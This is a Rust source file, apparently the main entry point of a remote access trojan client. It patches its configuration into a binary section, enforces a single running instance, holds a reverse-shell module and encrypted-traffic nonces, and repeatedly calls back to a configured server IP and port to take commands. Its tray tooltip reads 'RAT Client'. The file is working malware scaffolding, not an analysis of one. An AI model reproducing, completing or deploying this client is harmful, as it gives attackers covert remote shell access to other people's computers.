#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::net::TcpStream;
use std::sync::{ Arc, Mutex };
use std::thread::sleep;
use once_cell::sync::Lazy;
use rand_chacha::ChaCha20Rng;

use crate::features::tray_icon::TrayIcon;
use crate::handler::handle_server;

pub mod features;
pub mod service;
pub mod handler;

static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
    Mutex::new(service::mutex::MutexLock::new())
);
static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
    Mutex::new(features::reverse_shell::ReverseShell::new())
);
static SECRET_INITIALIZED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
static SECRET: Lazy<Mutex<[u8; common::SECRET_LEN]>> = Lazy::new(||
    Mutex::new([0u8; common::SECRET_LEN])
);

static NONCE_WRITE: Lazy<Mutex<Option<ChaCha20Rng>>> = Lazy::new(|| Mutex::new(None));
static NONCE_READ: Lazy<Mutex<Option<ChaCha20Rng>>> = Lazy::new(|| Mutex::new(None));

static IS_CONNECTED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));

fn main() {
    let config = service::config::get_config();

    {
        let mut mutex_lock_guard = MUTEX_SERVICE.lock().unwrap();
        mutex_lock_guard.init(config.mutex_enabled, config.mutex.clone());
    }

    let tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
    tray_icon.lock().unwrap().set_unattended(config.unattended_mode);

    loop {
        let config_clone = config.clone();
        let tray_icon_clone = tray_icon.clone();

        {
            let is_connected_guard = crate::IS_CONNECTED.lock().unwrap();

            if *is_connected_guard {
                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
                sleep(std::time::Duration::from_secs(5));
                continue;
            } else {
                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
            }
        }

        std::thread::spawn(move || {
            {
                let mut is_connected_guard = IS_CONNECTED.lock().unwrap();
                *is_connected_guard = true;
            }
            println!("Connecting to server...");
            let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));
            if let Ok(str) = stream {
                {
                    let mut is_connected_guard = IS_CONNECTED.lock().unwrap();
                    *is_connected_guard = true;
                }
                handle_server(str.try_clone().unwrap(), str.try_clone().unwrap());
            }
        });
        sleep(std::time::Duration::from_secs(5));
    }
}
